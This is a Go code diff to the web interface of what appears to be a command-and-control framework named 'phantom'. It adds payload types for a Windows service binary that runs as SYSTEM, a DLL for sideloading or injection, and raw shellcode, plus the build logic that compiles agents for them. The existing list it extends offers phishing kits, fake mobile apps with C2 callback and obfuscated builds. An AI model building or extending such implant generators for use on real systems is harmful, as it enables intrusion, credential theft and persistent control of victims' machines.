@@ -52,6 +52,9 @@ func (w *WebUI) handlePayloadTypes(rw http.ResponseWriter, r *http.Request) {
 		{"id": "android", "name": "Android Payload", "icon": "📱", "category": "Mobile", "desc": "Android stager + APK builder + phishing"},
 		{"id": "ios", "name": "iOS Payload", "icon": "🍎", "category": "Mobile", "desc": "iOS MDM profile + Apple ID phishing"},
 		{"id": "app", "name": "Fake Mobile App", "icon": "📲", "category": "Mobile", "desc": "Build fake app with C2 callback (30+ templates)"},
+		{"id": "svc-exe", "name": "Windows Service EXE", "icon": "⚙️", "category": "Service", "desc": "Windows service binary — install with sc create, runs as SYSTEM"},
+		{"id": "dll", "name": "DLL Payload", "icon": "📦", "category": "DLL", "desc": "DLL payload for sideloading or injection"},
+		{"id": "shellcode-raw", "name": "Raw Shellcode", "icon": "💾", "category": "Shellcode", "desc": "Position-independent shellcode (.bin)"},
 	}
 
 	rw.Header().Set("Content-Type", "application/json")
@@ -102,7 +105,7 @@ func (w *WebUI) handlePayloadGenerate(rw http.ResponseWriter, r *http.Request) {
 	rw.Header().Set("Content-Type", "application/json")
 
 	switch req.Type {
-	case "exe", "elf", "exe-garble", "elf-garble":
+	case "exe", "elf", "exe-garble", "elf-garble", "svc-exe", "dll":
 		resp := w.buildAgentBinary(req)
 		json.NewEncoder(rw).Encode(resp)
 
@@ -149,6 +152,8 @@ func (w *WebUI) buildAgentBinary(req PayloadRequest) PayloadResponse {
 	targetArch := "amd64"
 	obfuscate := false
 
+	buildMode := ""
+
 	switch req.Type {
 	case "exe":
 		targetOS = "windows"
@@ -157,6 +162,12 @@ func (w *WebUI) buildAgentBinary(req PayloadRequest) PayloadResponse {
 		obfuscate = true
 	case "elf-garble":
 		obfuscate = true
+	case "svc-exe":
+		targetOS = "windows"
+		buildMode = "service"
+	case "dll":
+		targetOS = "windows"
+		buildMode = "dll"
 	}
 
 	os.MkdirAll("build/agents", 0755)
@@ -165,9 +176,18 @@ func (w *WebUI) buildAgentBinary(req PayloadRequest) PayloadResponse {
 	if targetOS == "windows" {
 		ext = ".exe"
 	}
+	if buildMode == "dll" {
+		ext = ".dll"
+	}
 	filename := fmt.Sprintf("phantom-agent_%s_%s%s", targetOS, targetArch, ext)
 	if obfuscate {
 		filename = fmt.Sprintf("phantom-agent_%s_%s_garbled%s", targetOS, targetArch, ext)
+	}
+	if buildMode == "service" {
+		filename = fmt.Sprintf("phantom-svc_%s_%s%s", targetOS, targetArch, ext)
+	}
+	if buildMode == "dll" {
+		filename = fmt.Sprintf("phantom-agent_%s_%s%s", targetOS, targetArch, ext)
 	}
 	outputPath := filepath.Join("build", "agents", filename)
 
@@ -185,11 +205,20 @@ func (w *WebUI) buildAgentBinary(req PayloadRequest) PayloadResponse {
 		}
 	}
 
+	// Add service-specific flags
+	if buildMode == "service" {
+		ldflags += fmt.Sprintf(" -X '%s.RunAsService=true'", module)
+	}
+
 	// Set environment
 	env := os.Environ()
 	env = setEnvVar(env, "GOOS", targetOS)
 	env = setEnvVar(env, "GOARCH", targetArch)
-	env = setEnvVar(env, "CGO_ENABLED", "0")
+	if buildMode == "dll" {
+		env = setEnvVar(env, "CGO_ENABLED", "1")
+	} else {
+		env = setEnvVar(env, "CGO_ENABLED", "0")
+	}
 
 	// Find project root
 	projectRoot := findRoot()
